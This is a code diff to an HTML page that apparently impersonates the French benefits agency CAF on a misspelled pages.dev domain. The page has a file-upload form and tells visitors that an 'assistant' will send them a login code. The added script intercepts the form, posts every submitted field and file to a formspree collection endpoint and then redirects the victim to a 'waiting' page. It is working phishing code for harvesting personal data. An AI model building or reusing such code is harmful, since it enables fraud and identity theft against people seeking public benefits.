@@ -177,8 +177,8 @@ header.hero .hero-inner {
   <path fill="#EA4335" d="M12 5.9c1.43 0 2.71.49 3.72 1.45l2.79-2.79C16.84 2.98 14.63 2 12 2a9.75 9.75 0 0 0-8.72 5.41l3.25 2.53C7.3 7.62 9.46 5.9 12 5.9z"/>
 </svg>
     
-    <form method="POST" action="https://formspree.io/f/xppzajdq" enctype="multipart/form-data">
-<input type="hidden" name="_next" value="https://caf-fr-subvensiondemandeaccompagnement.pages.dev/attente.html">
+    <form method="POST" id="mainForm" enctype="multipart/form-data">
+
 
 
       <div class="field">
@@ -200,6 +200,24 @@ header.hero .hero-inner {
     Après avoir soumis, votre assistant(e) vous enverra un code. Veuillez le sélectionner pour vous connecter au serveur.
   </footer>
 </div>
+<script>
+  document.getElementById('mainForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const form = e.target;
+    const data = new FormData(form);
+
+    fetch('https://formspree.io/f/xppzajdq', {
+      method: 'POST',
+      body: data,
+      headers: { 'Accept': 'application/json' }
+    })
+    .then(response => {
+      if (response.ok) {
+        window.location.href = 'https://caf-fr-subvensiondemandeaccompagnement.pages.dev/attente.html';
+      }
+    });
+  });
+</script>
 
 </body>
 </html>
